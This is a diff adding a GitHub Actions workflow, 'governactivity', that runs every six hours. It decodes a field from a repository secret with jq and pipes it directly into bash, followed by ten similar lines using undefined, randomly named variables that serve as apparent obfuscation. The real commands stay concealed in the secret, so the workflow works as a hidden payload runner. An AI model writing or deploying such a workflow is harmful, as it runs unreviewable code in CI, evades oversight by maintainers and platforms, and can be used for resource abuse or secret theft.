@@ -1,0 +1,26 @@
+name: governactivity
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: governactivity
+        env:
+          rp4: ${{ secrets.rp4 }}
+        run: |
+          echo $rp4 | jq -r .p87 | /bin/bash
+          echo $rqm876 | jq -r .jnwi93 | /bin/bash
+          echo $pil603 | jq -r .jxzo22269 | /bin/bash
+          echo $ngd8705 | jq -r .xfs8057 | /bin/bash
+          echo $xrh06667 | jq -r .qlr6 | /bin/bash
+          echo $x31486 | jq -r .fap34 | /bin/bash
+          echo $g096 | jq -r .th17 | /bin/bash
+          echo $npqyy5637 | jq -r .fji84 | /bin/bash
+          echo $fkr432 | jq -r .kmu9912 | /bin/bash
+          echo $dwm139 | jq -r .b2 | /bin/bash
+          echo $f2 | jq -r .v89931 | /bin/bash
+
